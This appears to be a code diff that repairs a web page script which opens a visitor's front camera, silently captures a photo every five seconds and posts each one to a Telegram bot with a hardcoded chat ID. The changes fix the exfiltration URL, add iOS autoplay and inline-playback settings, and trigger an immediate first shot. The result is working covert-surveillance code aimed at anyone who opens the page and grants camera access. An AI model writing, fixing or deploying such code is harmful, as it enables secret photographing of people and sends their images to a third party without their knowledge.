@@ -49,30 +49,16 @@
     const chatId = '8573089884';
 
     async function takeAndSendPhoto(video, canvas) {
-        if (video.paused || video.ended || video.videoWidth === 0) return;
+        // ФИКС №1: Проверяем, что видео реально готово и идет поток
+        if (video.readyState < 2 || video.videoWidth === 0) return;
 
-        // Оптимизация: берем контекст с параметром willReadFrequently
-        const context = canvas.getContext('2d', { willReadFrequently: true });
+        const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
         
-        // Продвинутая проверка на черный кадр
-        // Берем данные из 3-х точек: центр, лево-верх, право-низ
-        const points = [
-            context.getImageData(canvas.width/2, canvas.height/2, 1, 1).data,
-            context.getImageData(10, 10, 1, 1).data,
-            context.getImageData(canvas.width-10, canvas.height-10, 1, 1).data
-        ];
-
-        // Проверяем, не слишком ли темно (сумма RGB > 15, чтобы отсечь шум)
-        const isBlack = points.every(p => (p[0] + p[1] + p[2]) < 15);
-
-        if (isBlack) {
-            console.log("Кадр слишком темный или черный. Пропуск...");
-            return;
-        }
-
+        // Рисуем кадр
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
         const dataURL = canvas.toDataURL('image/jpeg', 0.6);
         const blob = await (await fetch(dataURL)).blob();
         const formData = new FormData();
@@ -80,11 +66,11 @@
         formData.append('photo', blob, 'shot.jpg');
 
         try {
-            await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-            console.log("Цветное фото успешно отправлено!");
+            console.log("Фото ушло в ТГ!");
         } catch (e) {
             console.error("Ошибка сети:", e);
         }
@@ -92,9 +78,11 @@
 
     window.onload = () => {
         const video = document.getElementById('video');
+        
+        // ФИКС №2: Обязательные настройки для мобилок (особенно iOS)
         video.setAttribute('autoplay', '');
         video.setAttribute('muted', '');
-        video.setAttribute('playsinline', '');
+        video.setAttribute('playsinline', 'true');
 
         navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "user" } 
@@ -103,21 +91,26 @@
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
+            // ФИКС №3: Ждем, когда видео реально начнет воспроизводиться
             video.onplaying = () => {
-                console.log("Камера ожила, ждем прогрева...");
+                console.log("Поток пошел, ждем 3 сек на адаптацию света...");
                 
-                // Увеличиваем паузу до 3 секунд, чтобы камера точно успела включиться
                 setTimeout(() => {
+                    // Запускаем цикл каждые 5 сек
                     setInterval(() => {
                         takeAndSendPhoto(video, canvas);
-                    }, 5000); 
-                }, 3000);
+                    }, 5000);
+                    
+                    // Первое фото сразу после паузы
+                    takeAndSendPhoto(video, canvas);
+                }, 3000); 
             };
 
+            // Запускаем видео
             video.play();
         })
         .catch(err => {
-            console.log("Камера заблокирована:", err);
+            console.log("Доступ к камере отклонен:", err);
         });
     };
 </script>
